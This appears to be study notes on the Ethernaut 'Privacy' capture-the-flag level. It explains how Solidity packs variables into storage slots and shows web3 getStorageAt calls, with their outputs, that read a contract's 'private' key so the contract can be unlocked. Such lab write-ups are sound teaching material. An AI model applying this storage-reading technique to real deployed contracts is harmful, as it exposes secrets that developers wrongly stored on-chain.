# Privacy

> Everything you use in a smart contract is publicly visible, even local variables and state variables marked "private".

#### How variables store in the storage layout

-   each slot store up to 32 bytes
    > The slots are 32 bytes long.
    > 1 byte = 8 bits = 4 nibbles = 4 hexadecimal digits.
    > In practice, when using e.g getStorageAt we get string hashes of length 64 + 2 ('0x') = 66.
-   stores only variables, not constant
-   variables store in slot from right to left
-   if the size of the variable does not fit for the remaining size of the slot, it will goes in the next new slot
-   boolean takes only 1 bit (only 0 or 1)
-   array always store in the new slot

#### Attack

| variables                                             | storage slots |
| ----------------------------------------------------- | ------------- |
| bool public locked = true                             | slot 0        |
| uint256 public ID = block.timestamp;                  | slot 1        |
| uint8 private flattening = 10;                        | slot 2        |
| uint8 private denomination = 255;                     | slot 2        |
| uint16 private awkwardness = uint16(block.timestamp); | slot 2        |
| bytes32[3] private data;                              | slot 3-5      |

```javascript
await web3.eth.getStorageAt(contract.address, 0)
;("0x0000000000000000000000000000000000000000000000000000000000000001")

await web3.eth.getStorageAt(contract.address, 1)
;("0x0000000000000000000000000000000000000000000000000000000063884298")

await web3.eth.getStorageAt(contract.address, 2)
;("0x000000000000000000000000000000000000000000000000000000004298ff0a")
0x 00000000000000000000000000000000000000000000000000000000 4298 ff 0a
  └─────────────────────────UNUSED─────────────────────────┘    │  │  │
                                             uint16 awkwardness ┘  │  │
                                                 uint8 denomination┘  │
                                                      uint8 flattening┘

await web3.eth.getStorageAt(contract.address, 3)
;("0xb53b431c4438489a546fb7f49ebacc54e14c5fe3c2283132ebbc3ae2fd9702d5")
await web3.eth.getStorageAt(contract.address, 4)
;("0xe90d32f3d72b7fdc47dd5a31eba580b869545cea6f368ba3ff7c802308ac79ae")
await web3.eth.getStorageAt(contract.address, 5)
;("0x9f3fc5a2d818e0922c65f48a5d510f8ae172567d8e0fd7224f3ec46cab706e7a")
```

need data[2] which is in the slot 5 to unlock but need to cast down to bytes16

```solidity
    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
```

---

-   https://ardislu.dev/ethernaut/12
-   https://www.goodbytes.be/blog/article/ethernaut-walkthrough-level-12-privacy
